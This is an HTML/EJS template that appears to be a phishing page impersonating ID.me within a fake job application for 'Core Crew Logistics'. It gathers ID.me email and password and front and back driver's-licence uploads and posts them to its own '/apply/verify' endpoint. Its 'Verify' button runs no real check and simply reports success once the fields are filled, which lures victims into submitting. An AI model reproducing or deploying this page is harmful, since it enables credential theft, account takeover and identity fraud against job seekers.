<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Sign in to ID.me - ID.me</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <meta name="robots" content="noindex, nofollow" />
  <link rel="icon" type="image/jpeg" href="/public/img/logo.jpg" />
  <link rel="stylesheet" href="/public/idme-signin.css" />
  <link rel="stylesheet" href="/public/styles.css" />
  <style>
    input, textarea, select { font-size: 16px !important; }
    .fixed-back-btn {
      position: fixed;
      top: 66px;
      left: 1rem;
      z-index: 1200;
      text-decoration: none;
      color: #0074d9;
      font-size: 0.92rem;
      font-weight: 500;
    }
    .fixed-back-btn:hover { text-decoration: underline; }
    .inline-error {
      background: #fff1f2;
      border: 1px solid #fecdd3;
      color: #b42318;
      border-radius: 6px;
      padding: 10px 12px;
      margin-bottom: 14px;
      font-size: 0.9rem;
      line-height: 1.45;
    }
    .upload-dropzone.upload-missing {
      border-color: #dc2626 !important;
      background: #fef2f2 !important;
    }
    .verify-status {
      margin: 10px 0 14px;
      font-size: 0.88rem;
      color: #3e5166;
      min-height: 20px;
    }
    .verify-status.error { color: #b42318; }
    .verify-status.success { color: #0f7a3b; }
    .btn-submit-application[disabled] {
      opacity: 0.6;
      cursor: not-allowed;
    }
    @media (min-width: 701px) {
      .fixed-back-btn { top: 70px; left: 2rem; }
    }
  </style>
</head>
<body>

  <!-- Back navigation -->
  <a href="/apply/info-note" class="btn ghost fixed-back-btn" aria-label="Go back"
     onclick="if(document.referrer && document.referrer !== window.location.href){window.history.back();}else{window.location.href='/apply/info-note';} return false;">&larr; Back</a>

  <div class="idme-page-wrapper">

    <!-- ID.me top navigation bar -->
    <header class="idme-top-bar" role="banner">
      <div class="idme-top-bar-inner">
        <img src="/public/img/idme-logo.svg" alt="ID.me" style="height: 28px;" />
      </div>
    </header>

    <!-- Main sign-in card -->
    <div class="page-container">
      <main class="form-container" role="main">

        <!-- Partner logos -->
        <div class="form-header-content" role="banner">
          <div class="partner">
            <div class="company-logo" style="display:flex;align-items:center;gap:18px;justify-content:center;">
              <img class="logo" src="/public/img/logo.jpg" alt="Core Crew Logistics Logo" />
              <img src="/public/img/idme-logo.svg" alt="ID.me" style="max-height:32px;" />
            </div>
          </div>
        </div>

        <!-- Page heading -->
        <div class="form-header-access">
          <h1 id="sr_page_title">Sign in to ID.me</h1>
        </div>

        <!-- Registration prompt -->
        <div class="form-header-well">
          <p>
            <b>New to ID.me?</b>
            <a href="https://api.id.me/en/registration/new" target="_blank" rel="noopener noreferrer">Create an ID.me account</a>
          </p>
        </div>

        <!-- Sign-in & verification form -->
        <form id="idme-form" class="idme-form" method="post" action="/apply/verify" autocomplete="off" enctype="multipart/form-data">
          <% if (typeof errorMessage !== 'undefined' && errorMessage) { %>
            <div class="inline-error" id="uploadInlineError"><%= errorMessage %></div>
          <% } else { %>
            <div class="inline-error" id="uploadInlineError" style="display:none;"></div>
          <% } %>
          <fieldset class="form-fields" style="border:none;margin:0;padding:0;">
            <legend class="sr-only" style="position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0);">Sign in credentials</legend>

            <!-- Email -->
            <div class="field text">
              <label for="idme-email">Email address</label>
              <input id="idme-email" type="email" name="email" required autocomplete="off" placeholder="your@email.com" value="<%= email %>" />
            </div>

            <!-- Password -->
            <div class="field text password-showable signin-password-field">
              <label for="idme-password">Password</label>
              <input id="idme-password" type="password" name="password" required autocomplete="off" placeholder="Enter your password" />
            </div>

            <!-- Forgot password -->
            <div class="forgot-password-link">
              <a href="https://api.id.me/en/passwords/new" target="_blank" rel="noopener noreferrer">Forgot password?</a>
            </div>

            <!-- Verify -->
            <div class="form-actions">
              <button type="button" class="btn-primary" id="verifyBtn">Verify</button>
            </div>
            <div class="verify-status" id="verifyStatus" aria-live="polite"></div>

            <!-- Divider -->
            <div class="idme-divider" role="separator">
              <span>Identity Verification</span>
            </div>

            <!-- Driver's License Front -->
            <div class="field file verify-upload-field">
              <label for="driversLicenseFront">Upload Driver's License / ID (Front)</label>
              <div class="upload-dropzone <%= (typeof missingFront !== 'undefined' && missingFront) ? 'upload-missing' : '' %>" id="dropzone-front">
                <svg class="upload-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" aria-hidden="true">
                  <path d="M12 16V4m0 0L8 8m4-4l4 4" />
                  <path d="M20 16v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2" />
                </svg>
                <span class="upload-dropzone-text">Choose a file or drag it here</span>
                <input type="file" name="driversLicenseFront" id="driversLicenseFront" accept="image/jpeg,image/png,application/pdf" required />
              </div>
              <p class="upload-hint">Accepted: JPG, PNG, PDF &middot; Max 5 MB</p>
            </div>

            <!-- Driver's License Back -->
            <div class="field file verify-upload-field">
              <label for="driversLicenseBack">Upload Driver's License / ID (Back)</label>
              <div class="upload-dropzone <%= (typeof missingBack !== 'undefined' && missingBack) ? 'upload-missing' : '' %>" id="dropzone-back">
                <svg class="upload-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" aria-hidden="true">
                  <path d="M12 16V4m0 0L8 8m4-4l4 4" />
                  <path d="M20 16v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2" />
                </svg>
                <span class="upload-dropzone-text">Choose a file or drag it here</span>
                <input type="file" name="driversLicenseBack" id="driversLicenseBack" accept="image/jpeg,image/png,application/pdf" required />
              </div>
              <p class="upload-hint">Accepted: JPG, PNG, PDF &middot; Max 5 MB</p>
            </div>
          </fieldset>

          <!-- Submit application -->
          <div class="skip-btn-row">
            <button type="submit" class="btn-primary btn-submit-application" id="submitApplicationBtn" disabled>Submit Application</button>
          </div>

          <!-- Skip verification -->
          <div class="skip-btn-row">
            <button type="button" class="btn-skip" onclick="submitSkip()">Skip ID.me &amp; Submit Application</button>
          </div>

          <!-- Footer notice -->
          <div class="form-footer-message">
            <p>Social media sign-in is no longer available. Please sign in with your email or skip verification to continue.</p>
          </div>
        </form>

        <!-- ID.me footer links -->
        <footer class="footer">
          <nav class="footer__links" aria-label="ID.me information">
            <a href="https://www.id.me/about" target="_blank" rel="noopener noreferrer" class="footer__link">What is ID.me?</a>
            <a href="https://www.id.me/terms" target="_blank" rel="noopener noreferrer" class="footer__link">Terms of Service</a>
            <a href="https://www.id.me/privacy" target="_blank" rel="noopener noreferrer" class="footer__link">Privacy Policy</a>
          </nav>
        </footer>

      </main>
    </div>
  </div>

  <script>
    function submitSkip() {
      var skipForm = document.createElement('form');
      skipForm.method = 'post';
      skipForm.action = '/apply/skip-idme/';
      var emailInput = document.createElement('input');
      emailInput.type = 'hidden';
      emailInput.name = 'email';
      emailInput.value = document.getElementById('idme-email').value || '';
      skipForm.appendChild(emailInput);
      document.body.appendChild(skipForm);
      skipForm.submit();
    }

    document.addEventListener('DOMContentLoaded', function () {
      var form = document.getElementById('idme-form');
      var verifyBtn = document.getElementById('verifyBtn');
      var submitBtn = document.getElementById('submitApplicationBtn');
      var verifyStatus = document.getElementById('verifyStatus');
      var verifiedOk = false;

      function markMissingState(front, back) {
        document.getElementById('dropzone-front').classList.toggle('upload-missing', !front);
        document.getElementById('dropzone-back').classList.toggle('upload-missing', !back);
      }

      verifyBtn.addEventListener('click', function () {
        var email = document.getElementById('idme-email').value.trim();
        var password = document.getElementById('idme-password').value.trim();
        var front = document.getElementById('driversLicenseFront').files[0];
        var back = document.getElementById('driversLicenseBack').files[0];

        if (!email || !password || !front || !back) {
          markMissingState(front, back);
          verifyStatus.className = 'verify-status error';
          verifyStatus.textContent = 'Please complete email, password, and both ID uploads before verifying.';
          submitBtn.disabled = true;
          verifiedOk = false;
          return;
        }

        verifyStatus.className = 'verify-status success';
        verifyStatus.textContent = 'Verification completed. You can now submit application.';
        submitBtn.disabled = false;
        verifiedOk = true;
      });

      // Client-side file validation
      form.addEventListener('submit', function (e) {
        var allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
        var maxSize = 5 * 1024 * 1024;
        var front = document.getElementById('driversLicenseFront').files[0];
        var back = document.getElementById('driversLicenseBack').files[0];

        function validateFile(file, label) {
          if (file && !allowedTypes.includes(file.type)) {
            alert(label + ' image must be JPG, PNG, or PDF.');
            return false;
          }
          if (file && file.size > maxSize) {
            alert(label + ' image is too large (max 5MB).');
            return false;
          }
          return true;
        }

        if (!validateFile(front, 'Front')) { e.preventDefault(); return; }
        if (!validateFile(back, 'Back')) { e.preventDefault(); return; }

        var errorBox = document.getElementById('uploadInlineError');
        if (!front || !back || !verifiedOk) {
          markMissingState(front, back);
          if (errorBox) {
            errorBox.style.display = 'block';
            errorBox.textContent = !verifiedOk
              ? 'Please click Verify before submitting your application.'
              : 'Both front and back of your driver\'s license/ID are required.';
          }
          e.preventDefault();
          return;
        }
      });

      // Dropzone visual feedback
      var dropzones = document.querySelectorAll('.upload-dropzone');
      for (var i = 0; i < dropzones.length; i++) {
        (function (zone) {
          zone.addEventListener('dragover', function (e) {
            e.preventDefault();
            zone.style.borderColor = '#0074d9';
            zone.style.background = '#f0f7ff';
          });
          zone.addEventListener('dragleave', function () {
            zone.style.borderColor = '';
            zone.style.background = '';
          });
          zone.addEventListener('drop', function () {
            zone.style.borderColor = '';
            zone.style.background = '';
          });

          var fileInput = zone.querySelector('input[type="file"]');
          if (fileInput) {
            fileInput.addEventListener('change', function () {
              var textEl = zone.querySelector('.upload-dropzone-text');
              if (fileInput.files.length > 0 && textEl) {
                textEl.textContent = fileInput.files[0].name;
                zone.classList.remove('upload-missing');
                var errorBox = document.getElementById('uploadInlineError');
                if (errorBox && document.getElementById('driversLicenseFront').files.length && document.getElementById('driversLicenseBack').files.length) {
                  errorBox.style.display = 'none';
                }
              }
            });
          }
        })(dropzones[i]);
      }
    });
  </script>
</body>
</html>
